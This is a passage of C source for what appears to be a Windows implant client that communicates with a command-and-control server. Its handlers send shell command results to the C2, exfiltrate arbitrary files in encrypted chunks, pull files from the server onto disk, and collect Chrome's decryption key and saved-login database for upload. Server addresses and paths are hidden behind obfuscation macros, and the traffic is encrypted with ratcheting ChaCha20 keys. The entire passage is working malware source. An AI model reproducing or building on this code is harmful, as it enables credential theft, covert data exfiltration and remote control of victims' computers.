            Message_encrypt_large* message_encrypt_large = (Message_encrypt_large*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Message_encrypt_large));
            if (message_encrypt_large == NULL) {
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, ciphertext);
                debug_printf("[-] In Exec(): Failed to allocate data to message_encrypt_large\n");
                return ERROR_GEN_FAILURE;
            }
            
            // Filling neccesary fields
            debug_printf("[!] In Exec(): client_guid_ephemeral is %s\n", client_guid_ephemeral_b64);
            strcpy(message_encrypt_large->guid_ephmeral, client_guid_ephemeral_b64);
            message_encrypt_large->ciphertext.size = ciphertext_len;
            memcpy(message_encrypt_large->ciphertext.bytes, ciphertext, ciphertext_len);

            /* Serialize Message_encrypt_large */
            // SecureZeroMemory(pchRequest, REQUSET_BUFSIZE);
            // LPBYTE buffer_send = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, REQUSET_BUFSIZE);
            stream = pb_ostream_from_buffer(pchRequest, REQUSET_BUFSIZE);
            err_check = serialize(&stream, message_encrypt_large, Message_encrypt_large_fields);
            if (err_check == 0) {
                debug_printf(" [!] In Exec(): Can't serialize data for message_encrypt_large\n");
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, ciphertext);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                return ERROR_GEN_FAILURE;
            }
            /* Send data to C2 server */
            char URL[URL_SIZE] = {0}; 

            LAIKA_BOX_STARTVAR(char*, path_shellcmd, KEY_interneth_PATH_SHELLCMD, DATA_interneth_PATH_SHELLCMD)
            getting_URL(suburl_bin, path_shellcmd, URL);
            LAIKA_BOX_ENDVAR(path_shellcmd)
            char buffer_received[4096]; DWORD actualReceivedSize;
            #ifdef PRODUCTION
            LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_PROD, DATA_interneth_SERVER_ADDR_PROD);
            #else
            LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_TEST, DATA_interneth_SERVER_ADDR_TEST);
            #endif
            if (connectServer(server_addr, SERVER_PORT_C2, URL, 
                              pchRequest, err_check, 
                              (LPBYTE)buffer_received, sizeof(buffer_received), 
                              &actualReceivedSize) != ERROR_SUCCESS) {
                debug_printf("[-] Can't send protobuf in SHELLCMD\n");
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, ciphertext);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                return ERROR_GEN_FAILURE;
            }
            LAIKA_BOX_ENDVAR(server_addr);
            debug_printf("[+] In Exec(): I sent to server %lld\n", err_check);

            {
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, ciphertext);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
            }
            if (derive_nonce_kdf_session(key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                         suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                         key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                         client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                debug_printf("[-] Can't generate guid_ephmeral subURL and guid_kdf key\n");
                return ERROR_GEN_FAILURE;
            }
            if (derive_nonce_kdf_session(key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                         nonce_send, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                         key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                         session_key_send, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                debug_printf("[-] Can't generate send Session key\n");
                return ERROR_GEN_FAILURE;
            }
            if (derive_nonce_kdf_session(key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                         nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                         key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                         session_key_rcv, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                debug_printf("[-] Can't generate rcv Session key\n");
                return ERROR_GEN_FAILURE;
            }
    
            SecureZeroMemory(pchRequest, REQUSET_BUFSIZE);
            return ERROR_SUCCESS;
        }

        case UPLOAD: {
            debug_printf(" == EXECUTING UPLOAD ==\n");
            SecureZeroMemory(pchRequest, REQUSET_BUFSIZE);
            file_t fileTarget;
            LONGLONG fileSize;

            if (mapFile(args, &fileTarget)) {
                debug_printf("file size: %lld\n", fileTarget.fileSize.QuadPart);
                fileSize = fileTarget.fileSize.QuadPart;
                LONGLONG bytesRead = 0;

                /* Allocate memory for reading files, serialize and encryption*/
                DWORD chunkSize = 1024 * 1024 * 3;
                FileStream* fileStream = (FileStream*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FileStream));
                if (fileStream == NULL) {
                    debug_printf("[-] In Exec-UPLOAD:Failed to allocate memory for fileStream.\n");
                    // HeapFree(GetProcessHeap(), 0, chunk);;
                    return ERROR_GEN_FAILURE;
                }
                
                LPBYTE buffer_serialize = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, 1024 * 1048 * 3 * sizeof(BYTE));
                if (buffer_serialize == NULL) {
                    debug_printf("[-] In Exec UPLOAD: Failed to Allocate memory for buffer_serialize.\n");
                    // HeapFree(GetProcessHeap(), 0, chunk);
                    HeapFree(GetProcessHeap(), 0, fileStream);
                    return ERROR_GEN_FAILURE;
                }

                Message_encrypt_large* message_encrypt_large = (Message_encrypt_large*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Message_encrypt_large));
                if (message_encrypt_large == NULL) {
                    debug_printf("[-] In Exec UPLOAD: Failed to Allocate memory for buffer_serialize.\n");
                    HeapFree(GetProcessHeap(), 0, fileStream);
                    HeapFree(GetProcessHeap(), 0, buffer_serialize);
                    return ERROR_GEN_FAILURE;
                }

                pb_ostream_t stream;
                size_t err_check;

                char URL[URL_SIZE] = {0}; 
                for (DWORD i = 0; i < (fileSize + chunkSize - 1) / chunkSize; i++) {
                    debug_printf("i is: %ld\n", i);
                    LPBYTE ciphertext;
                    SecureZeroMemory(URL, sizeof(URL));
                    if (bytesRead + chunkSize <= fileSize) {
                        // Populate protobuf fields
                        strcpy(fileStream->guid, client_guid_real_b64);
                        fileStream->order = i;
                        strcpy(fileStream->filename, args);
                        fileStream->fileSize = fileSize;
                        fileStream->actualRead = chunkSize;
                        fileStream->chunk.size = chunkSize;
                        memcpy(fileStream->chunk.bytes, &fileTarget.lpBuffer[bytesRead], chunkSize);

                        // Serialize
                        stream = pb_ostream_from_buffer(buffer_serialize, 1024 * 1048 * 3);
                        err_check = serialize(&stream, fileStream, FileStream_fields);
                        if (err_check == 0) {
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            debug_printf("[-] In Exec() UPLOAD: Failed to serialzied fileStream\n");
                            return ERROR_GEN_FAILURE;
                        }
                        
                        /* Encrypt Message */
                        // Allocate buffer to hold the ciphertext
                        ciphertext = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, crypto_aead_chacha20poly1305_ABYTES + err_check);
                        size_t ciphertext_len;
                        if (ciphertext == NULL) {
                            debug_printf("[-] In Exec() UPLOAD: Failed to Allocate memory for ciphertext.\n");
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            return ERROR_GEN_FAILURE;
                        }
                        crypto_aead_chacha20poly1305_encrypt(ciphertext, &ciphertext_len, 
                                                            buffer_serialize, err_check, 
                                                            NULL, 0, NULL, 
                                                            nonce_send, session_key_send);

                        /* Encapsulate */
                        // Filling neccesary fields
                        strcpy(message_encrypt_large->guid_ephmeral, client_guid_ephemeral_b64);
                        message_encrypt_large->ciphertext.size = ciphertext_len;
                        memcpy(message_encrypt_large->ciphertext.bytes, ciphertext, ciphertext_len);
                        stream = pb_ostream_from_buffer(pchRequest, REQUSET_BUFSIZE);
                        err_check = serialize(&stream, message_encrypt_large, Message_encrypt_large_fields);
                        if (err_check == 0) {
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            HeapFree(GetProcessHeap(), 0, ciphertext);
                            debug_printf("[-] In Exec() UPLOAD: Failed to serialzied message_encrypt_large\n");
                            return ERROR_GEN_FAILURE;
                        }

                        BYTE buffer_received[4096]; DWORD actualReceivedSize;
                        LAIKA_BOX_STARTVAR(char*, path_upload, KEY_interneth_PATH_UPLOAD, DATA_interneth_PATH_UPLOAD)
                        getting_URL(suburl_bin, path_upload, URL);
                        LAIKA_BOX_ENDVAR(path_upload)

                        #ifdef PRODUCTION
                        LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_PROD, DATA_interneth_SERVER_ADDR_PROD);
                        #else
                        LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_TEST, DATA_interneth_SERVER_ADDR_TEST);
                        #endif
                        if (connectServer(server_addr, SERVER_PORT_C2, URL,
                                          pchRequest, err_check, 
                                          buffer_received, sizeof(buffer_received), 
                                          &actualReceivedSize) != ERROR_SUCCESS) {
                            debug_printf("[-] Can't send protobuf in UPLOAD\n");
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            HeapFree(GetProcessHeap(), 0, ciphertext);
                            return ERROR_GEN_FAILURE;
                        }
                        LAIKA_BOX_ENDVAR(server_addr);
                        bytesRead += chunkSize;
                        debug_printf("bytesRead: %lld", bytesRead);
                    } else {
                        debug_printf("bytesRead else: %lld", bytesRead);
                        size_t chunkSize_final = fileSize - bytesRead;
                        debug_printf("chunkSize_final is: %lld \n", chunkSize_final);
                        // Populate protobuf fields
                        strcpy(fileStream->guid, client_guid_real_b64);
                        fileStream->order = i;
                        strcpy(fileStream->filename, args);
                        fileStream->fileSize = fileSize;
                        fileStream->actualRead = chunkSize_final;
                        fileStream->chunk.size = chunkSize_final;
                        memcpy(fileStream->chunk.bytes, &fileTarget.lpBuffer[bytesRead], chunkSize_final);

                        debug_printf("Running 1\n");
                        // Serialize
                        stream = pb_ostream_from_buffer(buffer_serialize, 1024 * 1048 * 3);
                        err_check = serialize(&stream, fileStream, FileStream_fields);
                        if (err_check == 0) {
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            debug_printf("[-] In Exec() UPLOAD: Failed to serialzied fileStream\n");
                            return ERROR_GEN_FAILURE;
                        }
                        debug_printf("Running 2\n");

                        /* Encrypt Message */
                        // Allocate buffer to hold the ciphertext
                        ciphertext = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, crypto_aead_chacha20poly1305_ABYTES + err_check);
                        size_t ciphertext_len;
                        if (ciphertext == NULL) {
                            debug_printf("[-] In Exec() UPLOAD: Failed to Allocate memory for ciphertext.\n");
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            return ERROR_GEN_FAILURE;
                        }
                        crypto_aead_chacha20poly1305_encrypt(ciphertext, &ciphertext_len, 
                                                            buffer_serialize, err_check, 
                                                            NULL, 0, NULL, 
                                                            nonce_send, session_key_send);
                        debug_printf("Running 3\n");
                        /* Encapsulate */
                        // Filling neccesary fields
                        strcpy(message_encrypt_large->guid_ephmeral, client_guid_ephemeral_b64);
                        message_encrypt_large->ciphertext.size = ciphertext_len;
                        memcpy(message_encrypt_large->ciphertext.bytes, ciphertext, ciphertext_len);
                        debug_printf("Running 4\n");
                        stream = pb_ostream_from_buffer(pchRequest, REQUSET_BUFSIZE);
                        err_check = serialize(&stream, message_encrypt_large, Message_encrypt_large_fields);
                        debug_printf("Running 5\n");
                        if (err_check == 0) {
                            
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            HeapFree(GetProcessHeap(), 0, ciphertext);
                            debug_printf("[-] In Exec() UPLOAD: Failed to serialzied message_encrypt_large\n");
                            return ERROR_GEN_FAILURE;
                        }

                        BYTE buffer_received[4096]; DWORD actualReceivedSize;
                        LAIKA_BOX_STARTVAR(char*, path_upload, KEY_interneth_PATH_UPLOAD, DATA_interneth_PATH_UPLOAD)
                        getting_URL(suburl_bin, path_upload, URL);
                        LAIKA_BOX_ENDVAR(path_upload)

                        #ifdef PRODUCTION
                        LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_PROD, DATA_interneth_SERVER_ADDR_PROD);
                        #else
                        LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_TEST, DATA_interneth_SERVER_ADDR_TEST);
                        #endif
                        if (connectServer(server_addr, SERVER_PORT_C2, URL, 
                                          pchRequest, err_check, 
                                          buffer_received, sizeof(buffer_received), 
                                          &actualReceivedSize) != ERROR_SUCCESS) {
                            debug_printf("[-] Can't send protobuf in UPLOAD\n");
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            HeapFree(GetProcessHeap(), 0, ciphertext);
                            return ERROR_GEN_FAILURE;
                        }
                        LAIKA_BOX_ENDVAR(server_addr);
                        debug_printf("Running 6\n");
                    }
                    HeapFree(GetProcessHeap(), 0, ciphertext);
                    {
                        if (derive_nonce_kdf_session(key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                                    suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                                    key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                                    client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                            debug_printf("[-] Can't generate guid_ephmeral subURL and guid_kdf key\n");
                            return ERROR_GEN_FAILURE;
                        }
                        if (derive_nonce_kdf_session(key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                                    nonce_send, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                                    key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                                    session_key_send, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                            debug_printf("[-] Can't generate send Session key\n");
                            return ERROR_GEN_FAILURE;
                        }
                        if (derive_nonce_kdf_session(key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                                    nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                                    key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                                    session_key_rcv, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                            debug_printf("[-] Can't generate rcv Session key\n");
                            return ERROR_GEN_FAILURE;
                        }
                        sodium_bin2base64(client_guid_ephemeral_b64, sizeof(client_guid_ephemeral_b64), 
                                            client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES, 
                                            sodium_base64_VARIANT_ORIGINAL);
                    }
                    debug_printf("Running 7\n");
                    Sleep(20);
                }
                debug_printf("\nbytes read small:%llu\n", bytesRead);
                // HeapFree(GetProcessHeap(), 0, chunk);
                HeapFree(GetProcessHeap(), 0, fileStream);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                debug_printf("Running 8\n");
            } else {
                // No need to debug this block
                debug_printf("map file failed\n");
                unMapFile(&fileTarget);
                return ERROR_GEN_FAILURE;
            }
            
            unMapFile(&fileTarget);
            return ERROR_SUCCESS;
        }

        case DOWNLOAD: {
            debug_printf(" === Executing DOWNLOAD === \n");
            DWORD flag = ERROR_SUCCESS;
            // Parse Argument fileSize, fileName, 5000|example.txt
            size_t filesize = 0;
            char filename[256] = {0}; char filepath[512] = {0};
            DWORD chunkSize = 3145728;
            BYTE buffer_serialize[4096]; size_t actualSerializedSize;
            pb_ostream_t stream_o; pb_istream_t stream_i;
            size_t err_check;


            if (parseDownloadArg(args, &filesize, filename, filepath, sizeof(filename), sizeof(filepath)) != ERROR_SUCCESS) {
                debug_printf("in DOWNLOAD can't parse filesize and filename \n");
                return ERROR_GEN_FAILURE;
            }
            debug_printf("filesize is %lld\n", filesize);
            debug_printf("filename is %s\n", filename);
            debug_printf("filepath is %s\n", filepath);
            // HeapAlloc
            LPBYTE file_buffer = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, filesize);
            if (file_buffer == NULL) {
                debug_printf("Can't allocate file buffer\n");
                return ERROR_GEN_FAILURE;
            }
            File_Download_Response* file_response = (File_Download_Response*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(File_Download_Response));
            if (file_response == NULL) {
                debug_printf("Can't allocate file_response\n");
                HeapFree(GetProcessHeap(), 0, file_buffer);
                return ERROR_GEN_FAILURE;
            }
            Message_encrypt msg_enc = Message_encrypt_init_zero;
            LPBYTE received_decryption = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, REPLY_BUFSIZE); size_t actualDecryptedSize;
            if (received_decryption == NULL) {
                debug_printf("Can't allocate received_decryption\n");
                HeapFree(GetProcessHeap(), 0, file_buffer);
                HeapFree(GetProcessHeap(), 0, file_response);
                return ERROR_GEN_FAILURE;
            }
            // calculate max_order_times, aka max request times
            int max_request_times = (filesize + chunkSize - 1) / chunkSize;


            // 3|example.txt
            for (int order_time = 0; order_time < max_request_times; order_time++) {
                char URL[URL_SIZE] = {0};

                LAIKA_BOX_STARTVAR(char*, path_download, KEY_interneth_PATH_DOWNLOAD, DATA_interneth_PATH_DOWNLOAD)
                getting_URL(suburl_bin, path_download, URL);
                LAIKA_BOX_ENDVAR(path_download);

                // Construct File download request
                File_Download_Request fileRequest;
                strcpy(fileRequest.guid, client_guid_real_b64);
                strcpy(fileRequest.filename, filename);
                fileRequest.order = order_time;
                
                // Serialize Data
                stream_o = pb_ostream_from_buffer(buffer_serialize, sizeof(buffer_serialize));
                err_check = serialize(&stream_o, &fileRequest, File_Download_Request_fields);
                if (err_check == 0) {
                    debug_printf("can't serialize buffer\n");
                    flag = ERROR_GEN_FAILURE;
                    break;
                }
                actualSerializedSize = err_check;

                // Add encryption here
                uint8_t ciphertext[actualSerializedSize + crypto_aead_chacha20poly1305_ABYTES]; size_t ciphertext_len;
                crypto_aead_chacha20poly1305_encrypt(
                                            ciphertext, &ciphertext_len,
                                            buffer_serialize, actualSerializedSize,
                                            NULL, 0, NULL, 
                                            nonce_send, session_key_send);
                msg_enc.ciphertext.size = ciphertext_len;
                memcpy(msg_enc.ciphertext.bytes, ciphertext, ciphertext_len);
                strcpy(msg_enc.guid, client_guid_ephemeral_b64);
                
                // Serialzie Data Again
                SecureZeroMemory(buffer_serialize, sizeof(buffer_serialize));
                stream_o = pb_ostream_from_buffer(buffer_serialize, sizeof(buffer_serialize));
                err_check = serialize(&stream_o, &msg_enc, Message_encrypt_fields);
                actualSerializedSize = err_check;
                
                // Send to server
                DWORD actualReceivedSize;
                // Tell C2 server which chunk of the file we want
                #ifdef PRODUCTION
                LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_PROD, DATA_interneth_SERVER_ADDR_PROD);
                #else
                LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_TEST, DATA_interneth_SERVER_ADDR_TEST);
                #endif
                if (connectServer(server_addr, SERVER_PORT_C2, URL, 
                                 (LPBYTE) buffer_serialize, actualSerializedSize,
                                 (LPBYTE) pchReply, REPLY_BUFSIZE,
                                 &actualReceivedSize)) {
                    debug_printf("[-] Can't send protobuf in DOWNLOAD\n");
                    flag = ERROR_GEN_FAILURE;
                    break;
                }
                LAIKA_BOX_ENDVAR(server_addr);
                // Decrypt the received data
                if(crypto_aead_chacha20poly1305_decrypt(received_decryption, &actualDecryptedSize, NULL, 
                                            pchReply, actualReceivedSize, 
                                            NULL, 0, 
                                            nonce_rcv, session_key_rcv) != 0) {
                    debug_printf("In exec -> Download: Can't Decrypt received response from server \n");
                    debug_printf("Nonce_rcv:");print_base64(nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES);
                    flag = ERROR_GEN_FAILURE;
                    break;
                }
                // Deserialzie the pchReply
                stream_i = pb_istream_from_buffer(received_decryption, actualDecryptedSize);
                err_check = deserialize(&stream_i, file_response, File_Download_Response_fields);
                if (err_check != 0) {
                    debug_printf("[-] Exec DOWNLOAD: Can't deserialize decrypted Task message \n");
                    flag = ERROR_GEN_FAILURE;
                    break;
                }
                // Read files
                memcpy(&file_buffer[order_time * chunkSize], file_response->chunk.bytes, file_response->chunkSize);

                // Add Rachet
                if (derive_nonce_kdf_session(key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                            suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                            key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                            client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                    debug_printf("[-] Can't generate guid_ephmeral subURL and guid_kdf key\n");
                    flag = ERROR_GEN_FAILURE;
                    break;                
                }
                if (derive_nonce_kdf_session(key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                            nonce_send, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                            key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                            session_key_send, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                    debug_printf("[-] Can't generate send Session key\n");
                    flag = ERROR_GEN_FAILURE;
                    break;
                }
                if (derive_nonce_kdf_session(key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                            nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                            key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                            session_key_rcv, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                    debug_printf("[-] Can't generate rcv Session key\n");
                    flag = ERROR_GEN_FAILURE;
                    break;
                }
                sodium_bin2base64(client_guid_ephemeral_b64, sizeof(client_guid_ephemeral_b64), 
                                    client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES, 
                                    sodium_base64_VARIANT_ORIGINAL);
                Sleep(200);
            }
            DWORD numberBytesWritten = 0;
            HANDLE hFile;
            if (flag == ERROR_SUCCESS) {
                hFile = 
                CreateFileA(strcat(filepath, filename),
                            GENERIC_WRITE,
                            0,
                            NULL,
                            CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL,
                            NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    WriteFile(hFile, file_buffer, (DWORD)filesize, &numberBytesWritten, NULL);
                    CloseHandle(hFile);
                } else {
                    debug_printf("Cannot open file\n");
                    flag = ERROR_GEN_FAILURE;
                }
            } else {
                debug_printf("flag failed %ld", GetLastError());
            }
            HeapFree(GetProcessHeap(), 0, file_buffer);
            HeapFree(GetProcessHeap(), 0, file_response);
            HeapFree(GetProcessHeap(), 0, received_decryption);
            return flag;
        }

        case CHROME: {
            LPSTR key = getChromeDecryptionKey(NULL);
            if (key == NULL) {
                return ERROR_GEN_FAILURE;
            }
            LPSTR filePath = getChromeLocalLoginPath(NULL);
            if (filePath == NULL) {
                return ERROR_GEN_FAILURE;
            }
            file_t fileTarget;
            if (!mapFile(filePath, &fileTarget)) {
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            
            Chrome_info* chrome_info = (Chrome_info*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Chrome_info));
            if (chrome_info == NULL) {
                debug_printf("[-] In Exec CHROME: Failed to Allocate memory for chrome_info.\n");
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            LPBYTE buffer_serialize = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, 1024 * 1048 * 3 * sizeof(BYTE));
            if (buffer_serialize == NULL) {
                debug_printf("[-] In Exec CHROME: Failed to Allocate memory for buffer_serialize.\n");
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, chrome_info);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            
            Message_encrypt_large* message_encrypt_large = (Message_encrypt_large*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Message_encrypt_large));
            if (message_encrypt_large == NULL) {
                debug_printf("[-] In Exec UPLOAD: Failed to Allocate memory for message_encrypt_large.\n");
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, chrome_info);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            
            pb_ostream_t stream;
            size_t err_check;
            
            strcpy(chrome_info->guid, client_guid_real_b64);
            strcpy(chrome_info->enc_key, key);
            chrome_info->dbfile.size = fileTarget.fileSize.QuadPart;
            memcpy(chrome_info->dbfile.bytes, fileTarget.lpBuffer, fileTarget.fileSize.QuadPart);
            debug_printf("fileSize:%lld", fileTarget.fileSize.QuadPart);
            // Serialize
            stream = pb_ostream_from_buffer(buffer_serialize, 1024 * 1048 * 3);
            err_check = serialize(&stream, chrome_info, Chrome_info_fields);
            if (err_check == 0) {
                debug_printf("[-] In Exec UPLOAD: Failed to serialzie for chrome_info.\n");
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, chrome_info);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            
            // Encrypt
            LPBYTE ciphertext = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, crypto_aead_chacha20poly1305_ABYTES + err_check);
            if (ciphertext == NULL) {
                debug_printf("[-] In Exec UPLOAD: Failed to allocate mem for ciphertext.\n");
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, chrome_info);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            size_t ciphertext_len;
            crypto_aead_chacha20poly1305_encrypt(ciphertext, &ciphertext_len, 
                                                buffer_serialize, err_check, 
                                                NULL, 0, NULL, 
                                                nonce_send, session_key_send);

            /* Encapsulate */
            strcpy(message_encrypt_large->guid_ephmeral, client_guid_ephemeral_b64);
            message_encrypt_large->ciphertext.size = ciphertext_len;
            memcpy(message_encrypt_large->ciphertext.bytes, ciphertext, ciphertext_len);
            stream = pb_ostream_from_buffer(pchRequest, REQUSET_BUFSIZE);
            err_check = serialize(&stream, message_encrypt_large, Message_encrypt_large_fields);
            if (err_check == 0) {
                debug_printf("[-] In Exec UPLOAD: Failed to serialize for message_encrypt_large\n");
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, ciphertext);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, chrome_info);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }

            BYTE buffer_received[4096]; DWORD actualReceivedSize;
            char URL[URL_SIZE] = {0}; 

            LAIKA_BOX_STARTVAR(char*, path_chrome, KEY_interneth_PATH_CHROME, DATA_interneth_PATH_CHROME);
            getting_URL(suburl_bin, path_chrome, URL); 
            LAIKA_BOX_ENDVAR(path_chrome);
            
            #ifdef PRODUCTION
            LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_PROD, DATA_interneth_SERVER_ADDR_PROD);
            #else
            LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_TEST, DATA_interneth_SERVER_ADDR_TEST);
            #endif
            if (connectServer(server_addr, SERVER_PORT_C2, URL, 
                                pchRequest, err_check, 
                                buffer_received, sizeof(buffer_received), 
                                &actualReceivedSize) != ERROR_SUCCESS) {
                debug_printf("[-] Can't send protobuf in UPLOAD\n");
                unMapFile(&fileTarget);
                HeapFree(GetProcessHeap(), 0, ciphertext);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, chrome_info);
                HeapFree(GetProcessHeap(), 0, key);
                HeapFree(GetProcessHeap(), 0, filePath);
                return ERROR_GEN_FAILURE;
            }
            LAIKA_BOX_ENDVAR(server_addr);
